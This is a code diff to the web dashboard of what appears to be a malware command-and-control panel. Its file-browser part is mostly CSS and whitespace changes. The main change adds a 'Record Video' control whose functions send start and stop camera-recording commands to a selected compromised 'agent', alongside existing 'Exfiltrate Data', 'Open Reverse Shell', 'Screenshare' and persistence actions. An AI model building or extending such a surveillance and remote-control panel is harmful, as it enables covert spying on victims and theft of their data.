@@ -305,13 +305,38 @@
         }
 
         /*static files listing*/
-        #path-nav { margin-bottom: 10px; font-weight: bold; }
-        #path-nav a { color: blue; text-decoration: none; margin-right: 5px; }
-        #path-nav a:hover { text-decoration: underline; }
-        #file-list { list-style: none; padding: 0; }
-        #file-list li { padding: 5px; }
-        .directory { color: green; cursor: pointer; }
-        .file { color: black; }
+        #path-nav {
+            margin-bottom: 10px;
+            font-weight: bold;
+        }
+
+        #path-nav a {
+            color: blue;
+            text-decoration: none;
+            margin-right: 5px;
+        }
+
+        #path-nav a:hover {
+            text-decoration: underline;
+        }
+
+        #file-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        #file-list li {
+            padding: 5px;
+        }
+
+        .directory {
+            color: green;
+            cursor: pointer;
+        }
+
+        .file {
+            color: white;
+        }
 
         /* Status Dot Styles */
         .status-dot {
@@ -693,14 +718,14 @@
                                     throw new Error(`HTTP error! status: ${response.status}`);
                                 }
                                 const data = await response.json();
-                
+
                                 // Update path navigation
                                 updatePathNav(subpath);
-                
+
                                 // Update file list
                                 const fileList = document.getElementById("file-list");
                                 fileList.innerHTML = ""; // Clear previous contents
-                
+
                                 // Add directories
                                 data.dirs.forEach(dir => {
                                     const li = document.createElement("li");
@@ -717,7 +742,7 @@
                                     li.appendChild(link);
                                     fileList.appendChild(li);
                                 });
-                
+
                                 // Add files
                                 data.files.forEach(file => {
                                     const li = document.createElement("li");
@@ -729,21 +754,21 @@
                                     li.appendChild(link);
                                     fileList.appendChild(li);
                                 });
-                
+
                                 document.getElementById("status").style.display = "block";
                             } catch (error) {
                                 console.error("Error loading files:", error);
                                 document.getElementById("status").innerHTML = `<p>Error: ${error.message}</p>`;
                             }
                         }
-                
+
                         function updatePathNav(subpath) {
                             const pathNav = document.getElementById("path-nav");
                             pathNav.innerHTML = "";
-                
+
                             const parts = subpath ? subpath.split("/") : [];
                             let currentPath = "";
-                
+
                             // Root link
                             const rootLink = document.createElement("a");
                             rootLink.href = "#";
@@ -754,13 +779,13 @@
                                 updateURL("");
                             };
                             pathNav.appendChild(rootLink);
-                
+
                             // Build breadcrumb
                             parts.forEach((part, index) => {
                                 currentPath = currentPath ? `${currentPath}/${part}` : part;
                                 const separator = document.createTextNode(" > ");
                                 pathNav.appendChild(separator);
-                
+
                                 const link = document.createElement("a");
                                 link.href = "#";
                                 link.textContent = part;
@@ -773,19 +798,19 @@
                                 pathNav.appendChild(link);
                             });
                         }
-                
+
                         function updateURL(subpath) {
                             // Update the browser URL without reloading the page
                             const newURL = subpath ? `#/${subpath}` : "/";
                             window.history.pushState({ path: subpath }, "", newURL);
                         }
-                
+
                         // Handle browser back/forward buttons
                         window.onpopstate = (event) => {
                             const subpath = event.state ? event.state.path : "";
                             loadFiles(subpath);
                         };
-                
+
                         // Initial load based on URL hash
                         window.onload = () => {
                             const hash = window.location.hash;
@@ -794,7 +819,7 @@
                         };
                     </script>
                 </div>
-        
+
 
             </div>
         </div>
@@ -834,7 +859,7 @@
                 <button onclick="showSectionInPanelForAgentActions('dataExfil')">Exfiltrate Data</button>
                 <button onclick="showSectionInPanelForAgentActions('reverseShell')">Open Reverse Shell</button>
                 <button onclick="showSectionInPanelForAgentActions('screenshot')">Capture Screenshot</button>
-                <button onclick="showSectionInPanelForAgentActions('audio')">Record Audio</button>
+                <button onclick="showSectionInPanelForAgentActions('camera-record')">Record Video</button>
                 <button onclick="showSectionInPanelForAgentActions('screenshare')">Screenshare</button>
                 <button class="close-modal" onclick="closeMalwareActionsModal()">×</button>
             </div>
@@ -915,10 +940,21 @@
                     <p>Capture a screenshot from the agent.</p>
                     <button onclick="takeScreenshot()">Capture</button>
                 </div>
-                <div id="audio" class="content-section">
-                    <h3>Record Audio</h3>
-                    <input type="number" id="audioDuration" placeholder="Duration (seconds)">
-                    <button onclick="recordAudio()">Record</button>
+                <div id="camera-record" class="content-section"
+                    style="background-color: black; color: limegreen; padding: 20px; border-radius: 10px;">
+                    <h3>Record Video</h3>
+                    <label for="fps">FPS:</label>
+                    <input type="number" id="fps" placeholder="Enter FPS"
+                        style="background-color: black; color: limegreen; border: 1px solid limegreen;">
+
+                    <label for="recordTime">Record Time (s):</label>
+                    <input type="number" id="recordTime" placeholder="Enter seconds"
+                        style="background-color: black; color: limegreen; border: 1px solid limegreen;">
+
+                    <button id="startRecording" onclick="startRecording()"
+                        style="background-color: limegreen; color: black;">Start Recording</button>
+                    <button id="stopRecording" onclick="stopRecording()"
+                        style="background-color: red; color: black; display: none;">Stop Recording</button>
                 </div>
             </div>
         </div>
@@ -1325,7 +1361,55 @@
                 }
             }
         }
+        function startRecording() {
+            const fps = document.getElementById('fps').value;
+            const recordTime = document.getElementById('recordTime').value;
 
+            if (!fps || !recordTime) {
+                alert("Please enter valid FPS and record time.");
+                return;
+            }
+
+            const command = `start_video-${fps}-${recordTime}`;
+
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command: command })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(`Command sent: ${command}`);
+                    if (data.status) alert(data.status);
+                    document.getElementById('startRecording').style.display = 'none';
+                    document.getElementById('stopRecording').style.display = 'inline';
+                })
+                .catch(error => {
+                    alert("Failed to send the command. Please try again.");
+                    console.error('Error:', error);
+                });
+        }
+
+        function stopRecording() {
+            const command = "stop_video";
+
+            fetch('/input-command-to-execute-from-web', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ clientid: currentClientId, command: command })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log(`Command sent: ${command}`);
+                    if (data.status) alert(data.status);
+                    document.getElementById('startRecording').style.display = 'inline';
+                    document.getElementById('stopRecording').style.display = 'none';
+                })
+                .catch(error => {
+                    alert("Failed to send the command. Please try again.");
+                    console.error('Error:', error);
+                });
+        }
         function persistAgent() {
             if (confirm(`Establish persistence on agent ${currentClientId}?`)) {
                 alert(`Persistence established on agent ${currentClientId}`);
